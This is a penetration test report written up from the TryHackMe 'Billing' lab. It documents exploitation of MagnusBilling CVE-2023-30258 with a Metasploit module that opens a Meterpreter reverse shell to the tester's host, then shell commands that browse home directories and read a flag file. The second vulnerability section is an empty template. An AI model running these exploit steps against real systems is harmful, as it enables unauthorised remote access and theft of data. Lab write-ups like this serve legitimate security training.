# Penetration Test Report  
**Engagement:** TryHackMe - Billing  
**Date:** September 2025   
**Tester:** Colin S    

---

## Summary 
A penetration test was conducted against the TryHackMe Billing environment to assess the security of the deployed MagnusBilling application and underlying system. The assessment identified two high-impact vulnerabilities: An unauthenticated command injection in MagnusBilling permitted remote execution of arbitrary commands and local privilege escalation that enabled full root compromise.

Immediate recommendations are to update the MagnusBilling application to a patched version. User privileges should be reviewed to ensure low-privileged users cannot perform high-privilege actions on the host system.   
 
## Vulnerabilities  

### 1. Unauthenticated command injection
**CVSS v4.0 Base Score:** 9.3 (Critical)  
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:L  

**Summary:** An unauthenticated command injection in MagnusBilling permitted remote execution of arbitrary commands. This vulnerability can be exploited by attackers to execute arbitrary commands on the target system.  

**Background:** The current version of MagnusBilling in use by the organisation is vulnerable to CVE-2023-30258, which allows attackers to execute unauthenticated command injection attacks. As this is a known vulnerability multiple exploits exist online which can be used by attackers to quickly gain access to that target system. Once attackers gain access, they can remotely execute commands to perform a range of harmful actions.    

**Technical details & Evidence:**  The target host was exploited using Metasploit.
```bash
msfconsole
msf > use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258 
[*] Using configured payload php/meterpreter/reverse_tcp
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > show options
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOSTS 10.201.117.117
RHOSTS => 10.201.117.117
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST 10.4.12.97
LHOST => 10.4.12.97
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
[*] Started reverse TCP handler on 10.4.12.97:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.201.117.117:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 5 seconds.
[*] Elapsed time: 5.54 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (40004 bytes) to 10.201.117.117
[+] Deleted lXNeTcRvjvlN.php
[*] Meterpreter session 1 opened (10.4.12.97:4444 -> 10.201.117.117:38054) at 2025-09-23 21:08:15 +1000

meterpreter >
```
![Access - metasploit.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Billing/Images/Access%20-%20metasploit.png)  

Once initial access had been gained to the target the logged in user was able to navigate the file system and retrieve secrets.  
```bash
meterpreter > shell
Process 3384 created.
Channel 0 created.

whoami
asterisk
pwd
/var/www/html/mbilling/lib/icepay

cd /home
ls
debian
magnus
ssm-user
cd magnus
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
user.txt
cat user.txt
```
![flag1 - flag.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Billing/Images/Flag1%20-%20flag.png)  

**Impact:** An unauthenticated remote attacker can achieve arbitrary command execution as the user ```asterisk```; the absence of authentication makes this vulnerability critical. If an attacker exploits this vulnerability this enables information disclosure, persistence, and local privilege escalation attempts, which can significantly impact the organisation's business operations.    

**Remediation Advice:** It is strongly recommended to update MagnusBilling to the vendor-fixed release or apply the official patch immediately and block access to the vulnerable endpoint until updated. Rotate any credentials that could have been exposed and monitor web logs for exploitation indicators.  

---

### 2. 
**CVSS v4.0 Base Score:**


**Summary:**

**Background:** 

**Technical details & Evidence:** 

**Impact:** 

**Remediation Advice:** 

---
## Appendices  
[CVSS 4.0](https://www.first.org/cvss/calculator/4-0)  
[CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)  
[CVE-2023-30258 Exploit](https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/)  
[Fail2ban Exploit](https://packetstorm.news/files/189989)
